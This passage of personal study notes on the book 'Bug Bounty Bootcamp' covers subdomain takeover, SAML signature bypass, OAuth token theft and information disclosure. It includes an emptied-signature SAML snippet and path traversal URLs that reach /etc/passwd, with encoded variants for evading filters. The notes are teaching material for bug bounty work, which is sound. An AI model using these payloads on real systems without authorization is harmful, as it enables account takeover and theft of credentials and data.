  - As of the books writing, dangling CNAMEs from AWS, Bitbucket, and GitHub are potentially vulnerable, Squarespace and Google Cloud were not.
  - Find a full list of which third-parties are vulnerable on [EdOverflow's page](https://github.com/EdOverflow/can-i-take-over-xyz/).
    - You can find also find a list of page signatures that indicate an unregistered page there too.

_Step 3: Register the Page_

- Go to the third-party site and try to register the page as yours.
- Host a harmless POC page there to prove the subdomain takeover like an HTML page:
  `<html>Subdomain Takeover by Vickie Li.</HTML>`
  - Make sure to keep the site registered until the company mitigates the vulnerability by either removing the dangling DNS CNAME or by reclaiming the page on the third-party service so a malicious actor won't be able to.
- You may be able to steal cookies with the subdomain takeover if the site uses cookie-sharing SSO.
  - Look for cookies that can be sent to multiple subdomains in the server's responses.
  - Shared cookies are sent with the `Domain` attribute specifying the parents of subdomains that can access the cookie:
    `Set-Cookie: cookie=abc123; Domain=example.com; Secure: HttpOnly`
  - You can login to the legitimate site and visit your stolen site in the same browser to see if your server logs show the cookies from the legitimate site have been sent to it.
    - If this works, you've found a subdomain takeover that can be used to steal cookies.
    - Even if it can't steal cookies, the subdomain takeover could still be used for phishing campaigns. Report them to the organization.

**Monitoring for Subdomain Takeovers**

- Monitoring for subdomain takeovers is important because companies update their DNS entries and remove pages from third-party sites all the time.
- Routinely scanning for takeovers can help you find dangling CNAMEs or even just new assets to work on before others do.

(The following section in the book is a bit lack luster and feels a bit more like notes than a finished section.)

General steps to creating automation:

_Compile a list of subdomains that belong to the target organization_

- Scan for new subdomains periodically and add new ones to a list of monitored subdomains.

_Scan for subdomains on the list with CNAME entries that point to pages hosted on a vulnerable third-party service_

- You'll need to resolve the base DNS domain of the subdomain and determine if it's hosted on a third-party provider based on keywords in the URL.
- A subdomain that points to a URL that contains the string _github.io_ would be hosten on GitHub pages.
- Determine whether the third-party services you've found are vulnerable to takeovers.
- If the sites are exclusively hosten on services that aren't vulnerable to subdomain takeovers, you don't have to scan then for portential takeovers.
- _Not in the Book_ Use the site [EdOverflow's page](https://github.com/EdOverflow/can-i-take-over-xyz/) to find a list of vulnerable services, the right most column shows the signature that you can search HTTP responses for to determine if there is a dangling CNAME.

_Determine the signature of an unregistered page for each external service._

- Most services have a custom 404 Not Found pag that indicates the page isn't registered.
  - Use these pages to detect a potential takeover.
- ex. A GitHub pages domain would be vulnerable if the HTTP response contains, "`There isn't a GitHub Pages site here`" (No longer vulnerable except for edge cases).
- You can set up a cron job to run the script you've created regularly.
  - Set it up to notify you only if the monitoring system detects something fishy.

**Hunting for SAML Vulnerabilities**

- First, confirm whether the website is using SAML.
  - Intercept the traffic used for authenticating to a site and look for XML-like messages or the keyword `saml`.
  - SAML messages are not always passed in plain XML format. They may be base64 encoded or use other encoding schemes.

_Step 1: Locate the SAML Response_

- Use a proxy to intercept requests going between the browser and the service provider to look for the SAML response during login.

_Step 2: Analyze the Response Fields_

- Analyze the SAML response to identify which fields the service provider uses for determining the identity of the user.
  - SAML responses are used to relay authentication data to the service provider, so they must contain fields that communicate that information.
    - `username`, `email address`, `userID`, etc.
- Tamper with these fields in your proxy.
  - If the SAML message lacks a signature, or if the signature of the SAML response isn't verified at all, tampering with the message is all you need to do to authenticate as someone else.

_Step 3: Bypass the Signature_

- Try removing the signature to see if it is being verified if it doesn't exist.
- Try emptying the signature field:

  ```
  <saml:Signature>
    <saml:SignatureValue>

    </saml:SignatureValue>
  </saml:Signature>
  ```

- Try deleting the field entirely (delete the whole block of code shown above, including the signature value that isn't show).
- Try decoding the signature to see what it says. This may be the clue you need to start crafting your own signatures.

_Step 4: Re-encode the Message_

- Re-encode the signature back to its original form and send it back to the service provider.
- SAML Raider is a BurpSuite extension that can help you with editing and re-encoding SAML messages.

**Hunting for OAuth Token Theft**

- First, confirm the website is using OAuth.
  - intercept the requests to complete authentication on the website and look for the `oauth` keyword in the HTTP messages.
- Start looking for open redirect vulnerabilities [Chapter 7](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-7-open-redirects).
- Check if you can smuggle the OAuth tokens offsite by using one of the open redirects that you've found.

**Escalating the Attack**

- Because these attacks lead to account takeovers, they are high severity before any escalation.
- Try to access the victim's account on other sites by using the same OAuth credentials.
  - If you can leak an employee's cookies via subdomain takeover, see if you can access their company's internal services such as admin panels, business intelligence systems, and HR applications with the same credentials.
- Try to leak data, execute sensitive actions, or take over the application by using the accounts you've taken over.

**Finding Your First SSO Bypass**

1. If the target application is using single sign-on, determine the SSO mechanism in use.
2. If the application is using shared session cookies, try to steal session cookies by using subdomain takeovers.
3. If the application uses a SAML-based SSO scheme, test whether the server is verifying SAML signatures properly.
4. If the applications uses OAuth, try to steal OAuth tokens by using open redirects.
5. Submit your report about SSO bypass to the bug bounty program!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 21: Information Disclosure

"The IDOR vulnerabilities covered in Chapter 10 are a common way for applications to leak private information about users. But an attacker can uncover sensitive information from a target application in other ways too. I call these bugs _information disclosure_ bugs. These bugs are common; in fact, they're the type of bug I find most often while bug bounty hunting, even when I'm searching for other bug types."

**Mechanisms**

"Information Disclosure occurs when an application fails to properly protect sensitive information, giving users access to information they shouldn't have available to them."

Can Include:

- Technical details that aid an attack
  - software version numbers
  - Internal IP addresses
  - Sensitive File Names and filepaths (configs (could contain internal IPs access tokens, etc), /etc/passwd, /etc/shadow, etc.)
  - Source code
  - Private information of users (age, bank accounts numbers, email addresses, mailing addresses, credit card numbers, etc.)
- Typically, applications leak version numbers in HTTP response headers, HTTP response bodies, or other server responses.
  - `X-Powered-By` header shows which framework the application runs:
    `X-Powered-By: PHP/5.2.17`
- Applications leak sensitive configuration files by not applying proper access control to the files, or by accidentally uploading a sensitive file onto a public repository that outside users can access.
- Source code should also be protected. Attackers will search source code for:
  - Logic flaw vulnereabilities
  - Hardcoded credentials
  - Information about the company's infrastructure (Internal IPs)
- Applications often leak source code by accidentally publishing a private code repository, by sharing code snippets on public GitHub or GitLab repositories, or by uploading it to third-party sites like Pastebin.
- Devs may accidentally place information that is compromising in the public source code like HTML and JavaScript files.

**Prevention**

- Avoid hardcoding credentials and other sensitive information into executable code.
- Place sensitive information in separate configuration files or a secret storage system like [Vault](https://github.com/hashicorp/vault/).
- Audit your public code repositories periodically to make sure sensitive files haven't been uploaded by accident.
  - Auditing tool: [secret-bridge](https://github.com/duo-labs/secret-bridge/).
- If you have to upload sensitive files to the production server, apply granular access control to restrict user's access to the files.
- Remove data from services and server responses that reveal technical details about hte backend server setup and software versions.
- Handle all exceptions by returning a generic erro page to the user, instead of a technical page that reveals details about the error.

**Hunting for Information Disclosure**

- Use the techniques in [Chapter 5](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-5-web-hacking-reconnaissance) to start looking for exposed configuration files, database files, and other sensitive files.

_Step 1: Attempt a Path Traversal Attack_

- _Path Traversal Attacks_ are used to access files outside the web application's root folder.
  - This attack uses `../../` to escape the web root folder in Unix systems to access system files.
  - ex. `https://example.com/image?url=/images/1.png`
  - You can navigate out of the images directory and (hopefully) into the web root directory with:
    `https://example.com/image?url=/images/../index.html`
  - You can go farther back and access system files outside of the web directory with:
    `https://example.com/image?url=/images/../../../../../../../../etc/passwd`
  - The amount of `../` to use can vary depending on the application, so trial and error is often necessary. However, you cannot go farther back than the root directory `/` so if you add 4 `../` and escape to the system root directory, 5 `../` should also work the same.
  - If the application uses input sanitization, you can try encoding the `../`.
    - `%2e%2e%2f` URL encoding.
    - `%252e%252e%255f` Double URL encoding.
    - `..%2f` Partial URL encoding.

_Step 2: Search the Wayback Machine_

- You can use the Wayback Machine to find hidden and deprecated endpoints, as well as a large number of current endpoints without actively crawling the site.

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
